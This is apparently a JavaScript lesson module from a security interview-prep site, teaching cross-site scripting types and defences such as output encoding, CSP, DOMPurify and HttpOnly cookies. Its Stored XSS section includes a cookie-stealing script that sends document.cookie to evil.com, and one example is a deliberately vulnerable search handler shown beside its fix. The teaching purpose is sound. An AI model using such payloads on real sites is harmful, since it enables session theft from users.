const e={id:"auth-xss",title:"XSS (Cross-Site Scripting)",difficulty:"intermediate",estimatedMinutes:25,tldr:["XSS is a vulnerability where attackers inject malicious scripts into web pages viewed by other users.","Types: Stored (persistent — script saved on server), Reflected (non-persistent — script in URL/request), DOM-based (client-side script manipulation).","Impact: session hijacking, credential theft, keylogging, phishing, website defacement, malware distribution.","Prevention: output encoding/escaping, Content-Security-Policy (CSP), input validation, HttpOnly cookies, sanitization libraries."],laymanDefinition:"XSS is like someone slipping a malicious note into a library book. When another person reads the book (visits the page), the note executes — it could steal their library card (session), change what they see, or redirect them to a fake library website.",deepDive:[{heading:"Stored XSS (Persistent)",text:"Attacker injects script into a database (comments, posts, profiles). Every user who views that page executes the script. Most dangerous type — affects many users without additional social engineering. Example: <script>fetch(\\'https://evil.com/steal?c=\\'+document.cookie)<\/script> in a comment."},{heading:"Reflected XSS (Non-Persistent)",text:"Malicious script is part of the request (URL parameter, form input). Server reflects it in the response without proper encoding. Requires victim to click a crafted link. Example: https://site.com/search?q=<script>alert(\\'XSS\\')<\/script>."},{heading:"DOM-Based XSS",text:"Vulnerability exists entirely in client-side JavaScript. The page uses untrusted data from location.hash, document.URL, or window.name to modify the DOM via innerHTML, document.write, or eval. Server may never see the malicious payload. Requires careful review of client-side code."},{heading:"Content-Security-Policy (CSP)",text:"HTTP header that restricts what resources can load on your page. script-src: controls allowed script sources. object-src \\'none\\': prevents Flash/plugin execution. base-uri \\'self\\': prevents base tag injection. Report-URI: receive violation reports. CSP can block most XSS even if injection occurs."},{heading:"XSS Prevention by Context",text:`HTML context: encode < > & " \\'. Use escapeHtml(). Attribute context: encode quotes. Use escapeAttribute(). JavaScript context: never interpolate untrusted data in strings. Use JSON.stringify() and encodeURIComponent(). URL context: validate protocol (http/https only). CSS context: avoid dynamic styles.`}],interviewAnswer:"XSS is the most common web vulnerability. Always encode output based on context (HTML, attribute, JS, URL, CSS). Use CSP as a safety net. Set HttpOnly cookies to protect session tokens. Use modern frameworks (React, Vue) that auto-encode. Never use innerHTML or dangerouslySetInnerHTML with untrusted data.",interviewQuestions:[{question:"What is XSS?",answer:"Cross-Site Scripting — injecting malicious scripts into web pages viewed by other users."},{question:"What are the three types of XSS?",answer:"Stored (persistent), Reflected (non-persistent), DOM-based (client-side)."},{question:"What is Stored XSS?",answer:"Malicious script is stored on the server (database) and served to all users who view the page. Most dangerous."},{question:"What is Reflected XSS?",answer:"Malicious script is in the request (URL/param) and immediately reflected in the response without encoding."},{question:"What is DOM-based XSS?",answer:"Vulnerability in client-side JavaScript — untrusted data modifies the DOM via innerHTML, document.write, etc."},{question:"What is the most effective XSS defense?",answer:"Output encoding/escaping based on context (HTML, attribute, JS, URL, CSS)."},{question:"What is Content-Security-Policy?",answer:"An HTTP header that restricts what resources can load — acts as a safety net against XSS."},{question:"How do HttpOnly cookies help against XSS?",answer:"They prevent JavaScript from accessing session cookies — even if XSS executes, cookies are safe."},{question:"Why are modern frameworks safer against XSS?",answer:"React, Vue, Angular auto-encode output by default. You must explicitly bypass (dangerouslySetInnerHTML)."},{question:"What is the difference between XSS and CSRF?",answer:"XSS: injects malicious script. CSRF: forges requests using victim\\'s auth. XSS can steal tokens; CSRF cannot."}],diagramSvg:'<svg viewBox="0 0 500 300" xmlns="http://www.w3.org/2000/svg" style="max-width:100%;height:auto;font-family:sans-serif"><defs><marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0,0 L10,5 L0,10" fill="#666" opacity="0.7"/></marker></defs><rect x="0" y="0" width="500" height="300" rx="10" fill="#f8f9fa" stroke="#dee2e6" stroke-width="1"/><text x="250" y="28" text-anchor="middle" font-size="14" font-weight="bold" fill="#333">XSS (Cross-Site Scripting)</text><rect x="10" y="35" width="110" height="25" rx="5" fill="#0070f3" stroke="#0070f3" stroke-width="1.5"/><text x="65" y="51" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">Stored XSS</text><text x="65" y="54" text-anchor="middle" font-size="9" fill="#ddd">Script in database</text><rect x="10" y="65" width="110" height="25" rx="5" fill="#28a745" stroke="#28a745" stroke-width="1.5"/><text x="65" y="81" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">Reflected XSS</text><text x="65" y="84" text-anchor="middle" font-size="9" fill="#ddd">Script in URL</text><rect x="10" y="95" width="110" height="25" rx="5" fill="#ffc107" stroke="#ffc107" stroke-width="1.5"/><text x="65" y="111" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">DOM XSS</text><text x="65" y="114" text-anchor="middle" font-size="9" fill="#ddd">Client-side only</text><rect x="10" y="125" width="110" height="25" rx="5" fill="#dc3545" stroke="#dc3545" stroke-width="1.5"/><text x="65" y="141" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">Impact</text><text x="65" y="144" text-anchor="middle" font-size="9" fill="#ddd">Session theft</text><rect x="10" y="155" width="110" height="25" rx="5" fill="#e83e8c" stroke="#e83e8c" stroke-width="1.5"/><text x="65" y="171" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">Prevention</text><text x="65" y="174" text-anchor="middle" font-size="9" fill="#ddd">Output encode + CSP</text><line x1="120" y1="48" x2="150" y2="48" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)"/><line x1="120" y1="78" x2="150" y2="78" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)"/><line x1="120" y1="108" x2="150" y2="108" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)"/><line x1="120" y1="138" x2="150" y2="138" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)"/><line x1="120" y1="168" x2="150" y2="168" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)"/><rect x="160" y="35" width="230" height="155" rx="5" fill="#17a2b8" stroke="#17a2b8" stroke-width="1.5"/><text x="275" y="51" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">XSS (Cross-Site Scripting)</text><text x="275" y="162" text-anchor="middle" font-size="9" fill="#ddd">Script injection: Stored, Reflected, DOM-</text><text x="275" y="173" text-anchor="middle" font-size="9" fill="#ddd">based. Prevent with encoding, CSP, HttpOn</text><text x="275" y="184" text-anchor="middle" font-size="9" fill="#ddd">ly.</text><text x="240" y="220" font-size="9" fill="#666" text-anchor="middle">XSS: Malicious script injection — steal sessions, </text><text x="240" y="232" font-size="9" fill="#666" text-anchor="middle">deface sites, phish users. Encode output, use CSP.</text></svg>',codeExamples:[{title:"XSS Prevention: Output Encoding",useCase:"Encode based on context.",code:`// HTML context — encode < > & " '
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// NEVER do this:
element.innerHTML = userInput; // XSS!

// ALWAYS do this:
element.textContent = userInput; // safe

// Or use a sanitization library:
const sanitized = DOMPurify.sanitize(userInput);
element.innerHTML = sanitized; // safe`,description:"Output encoding and safe DOM APIs prevent XSS in HTML context."},{title:"Content-Security-Policy Header",useCase:"Safety net against XSS.",code:`// CSP Header (Express middleware)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self';" +
    "script-src 'self' https://cdn.example.com;" +
    "style-src 'self' 'unsafe-inline';" +
    "img-src 'self' data: https:;" +
    "object-src 'none';" +
    "base-uri 'self';" +
    "frame-ancestors 'none';" +
    "form-action 'self';"
  );
  next();
});

// CSP Report-Only mode (test before enforcing)
res.setHeader(
  'Content-Security-Policy-Report-Only',
  "default-src 'self'; report-uri /csp-reports"
);`,description:"CSP restricts what resources can execute, blocking most XSS even if injection occurs."},{title:"Sanitize User Input (DOMPurify)",useCase:"Allow safe HTML.",code:`// Install: npm install dompurify
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// User-submitted content with HTML
const userComment = '<b>Great post!</b><script>stealCookies()<\/script>';

const clean = DOMPurify.sanitize(userComment);
console.log(clean);
// '<b>Great post!</b>' — script tag removed

// DOMPurify removes:
// - script tags, event handlers (onclick)
// - javascript: URLs, dangerous SVG
// - allows safe tags: b, i, em, strong, a, p`,description:"DOMPurify sanitizes HTML while preserving safe tags — useful for rich user content."},{title:"HttpOnly Cookie Protection",useCase:"Protect session from XSS.",code:`// Session cookie — inaccessible to JavaScript
res.cookie('session_id', sessionId, {
  httpOnly: true, // JS cannot read this
  secure: true,
  sameSite: 'lax'
});

// Even if XSS executes:
// document.cookie → does NOT include httpOnly cookies
// Attacker cannot steal the session token

// What XSS can still do:
// - Make API calls (but cookies restricted)
// - Deface the page
// - Keylog user input
// - CSRF (if no SameSite + CSRF tokens)

// Best practice:
// httpOnly cookies + CSP + output encoding`,description:"HttpOnly cookies prevent JavaScript access to session tokens, mitigating XSS cookie theft."},{title:"XSS in URL Parameters (Reflected)",useCase:"Validate and encode URL input.",code:`// Vulnerable: reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q;
  // <script>alert('XSS')<\/script> executes!
  res.send('<p>Search results for: ' + query + '</p>');
});

// Fixed: encode output
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q || '');
  res.send('<p>Search results for: ' + query + '</p>');
});

// Alternative: use a template engine (auto-escaped)
// EJS: <%= query %> — auto-escaped
// <%- query %> — raw (XSS if untrusted)`,description:"Always encode user input when reflecting it in responses — never concatenate untrusted data into HTML."},{title:"Trusted Types (CSP Enhancement)",useCase:"Prevent DOM XSS at browser level.",code:`// CSP with Trusted Types
res.setHeader('Content-Security-Policy',
  "require-trusted-types-for 'script';"
);

// Creates a Trusted Type policy
const sanitizePolicy = trustedTypes.createPolicy(
  'sanitize', {
    createHTML: (input) => DOMPurify.sanitize(input)
  }
);

// Only Trusted Types can set innerHTML
element.innerHTML = sanitizePolicy.createHTML(input);

// Without Trusted Type: browser blocks it
element.innerHTML = untrustedString; // Blocked!`,description:"Trusted Types enforce that only sanitized strings can be assigned to dangerous DOM sinks."}],mcqQuestions:[{question:"What are the three types of XSS?",options:["Stored, Reflected, DOM","GET, POST, PUT","Client, Server, Network","SQL, NoSQL, API"],answer:0,explanation:"Stored (persistent), Reflected (non-persistent), DOM-based (client-side)."},{question:"Which XSS type is most dangerous?",options:["Reflected","Stored","DOM","All are equal"],answer:1,explanation:"Stored XSS is most dangerous because it affects every user who views the page without requiring a crafted link."},{question:"What is the primary XSS defense?",options:["Input validation","Output encoding","Rate limiting","Authentication"],answer:1,explanation:"Output encoding/escaping based on context is the primary defense."},{question:"What does Content-Security-Policy do?",options:["Encrypts traffic","Restricts resource loading","Blocks IPs","Validates tokens"],answer:1,explanation:"CSP restricts what resources (scripts, styles, etc.) can load and execute."},{question:"How do HttpOnly cookies prevent XSS?",options:["Encrypt cookie values","Block JS access to cookies","Shorten cookie lifetime","Limit cookie domain"],answer:1,explanation:"HttpOnly prevents JavaScript from accessing the cookie — even with XSS, session is safe."},{question:"What is DOM-based XSS?",options:["Server-side injection","Client-side JS vulnerability","Database injection","Network attack"],answer:1,explanation:"DOM-based XSS occurs entirely in client-side JavaScript without server involvement."}]};export{e as auth_xss};
